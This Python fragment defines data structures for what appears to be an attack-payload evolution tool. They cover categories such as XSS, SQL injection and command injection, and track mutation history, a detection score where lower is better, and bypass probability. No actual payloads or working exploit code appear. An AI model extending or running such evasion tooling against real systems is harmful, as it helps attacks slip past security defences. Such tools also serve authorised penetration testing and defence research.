class PayloadCategory(Enum):
    """Classification of payload types."""
    XSS = "xss"
    SQLI = "sqli"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    XXE = "xxe"
    SSTI = "ssti"
    GENERAL = "general"


@dataclass
class Payload:
    """A single payload with its metadata and fitness score."""
    content: str
    category: PayloadCategory
    generation: int = 0
    fitness_score: float = 1.0
    parent_ids: List[str] = field(default_factory=list)
    mutation_history: List[str] = field(default_factory=list)
    injected_tokens: List[str] = field(default_factory=list)
    detection_score: float = 1.0  # Lower is better (less detected)
    bypass_probability: float = 0.0

    @property
    def id(self) -> str:
        return hashlib.md5(self.content.encode()).hexdigest()[:12]


@dataclass
class EvolutionResult:
    """Complete result of a payload evolution run."""
    original_payload: Payload
    best_payload: Payload
    generations: int
    population_history: List[List[Payload]]
    fitness_curve: List[float]
    total_mutations: int
    time_elapsed: float
    final_bypass_probability: float


